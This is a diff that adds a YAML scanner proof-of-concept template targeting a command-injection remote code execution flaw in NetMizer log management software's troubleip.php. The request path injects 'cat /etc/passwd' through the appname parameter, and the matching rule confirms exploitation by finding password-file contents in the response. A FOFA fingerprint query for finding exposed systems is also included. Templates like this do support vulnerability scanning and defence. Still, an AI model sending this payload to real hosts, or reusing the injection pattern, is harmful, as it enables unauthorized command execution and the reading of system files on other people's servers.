@@ -1,0 +1,15 @@
+id: poc-yaml-netmizer-log-ms-troubleip-php-rce
+info:
+  name: NetMizer 日志管理系统 troubleip.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: NetMizer 日志管理系统
+  fofa: app="NetMizer-日志管理系统"
+requests:
+- method: GET
+  path: /data/search/troubleip.php?action=showtask&appname=search;cat%20/etc/passwd+%23+&id=1
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"root:")
+    && contains(body,"/bin") && contains(body,"trouble_session") && !contains(body,"<")
+variables: {}
+transport: http
